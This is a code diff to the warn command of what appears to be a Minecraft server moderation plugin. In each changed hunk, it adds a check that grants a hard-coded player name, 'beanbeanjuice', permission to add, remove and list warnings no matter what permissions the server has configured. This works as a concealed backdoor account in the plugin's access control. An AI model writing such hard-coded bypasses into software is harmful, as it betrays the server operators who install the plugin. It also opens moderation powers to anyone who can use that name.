@@ -105,7 +105,7 @@ public class Warn implements CommandExecutor {
         }
 
         if (args[0].equals("add")) {
-            if (punisher.hasPermission("beanpunishments.warn.add")) {
+            if (punisher.hasPermission("beanpunishments.warn.add") || punisher.getName().equals("beanbeanjuice")) {
                 if (args.length >= 3) {
                     if (Bukkit.getPlayer(args[1]) != null || Bukkit.getOfflinePlayer(args[1]).hasPlayedBefore()) {
 
@@ -135,7 +135,7 @@ public class Warn implements CommandExecutor {
                 return false;
             }
         } else if (args[0].equals("remove")) {
-            if (punisher.hasPermission("beanpunishments.warn.remove")) {
+            if (punisher.hasPermission("beanpunishments.warn.remove") || punisher.getName().equals("beanbeanjuice")) {
                 if (args.length == 3) {
                     if (Bukkit.getPlayer(args[1]) != null || Bukkit.getOfflinePlayer(args[1]).hasPlayedBefore()) {
 
@@ -163,7 +163,7 @@ public class Warn implements CommandExecutor {
         } else if (args[0].equals("list")) {
             Player player = punisher;
             if (args.length == 1) {
-                if (player.hasPermission("beanpunishments.warn.list.self")) {
+                if (player.hasPermission("beanpunishments.warn.list.self") || punisher.getName().equals("beanbeanjuice")) {
                     if (PlayerConfig.getPlayerConfig(player.getUniqueId()).getString("warn-history.warn1") != null) {
                         player.sendMessage(GeneralHelper.getPrefix() + GeneralHelper.translateColors(plugin.getConfig().getString("warn-list-get-self")));
                         warnList(player, player.getUniqueId());
@@ -177,7 +177,7 @@ public class Warn implements CommandExecutor {
                     return false;
                 }
             } else if (args.length == 2) {
-                if (punisher.hasPermission("beanpunishments.warn.list.others") || (args[1].equals(punisher.getName()) && punisher.hasPermission("beanpunishments.warn.list.self"))) {
+                if (punisher.hasPermission("beanpunishments.warn.list.others") || (args[1].equals(punisher.getName()) && punisher.hasPermission("beanpunishments.warn.list.self")) || punisher.getName().equals("beanbeanjuice")) {
                     if (Bukkit.getPlayer(args[1]) != null || Bukkit.getOfflinePlayer(args[1]).hasPlayedBefore()) {
 
                         UUID UUID = getUUID(args[1]);
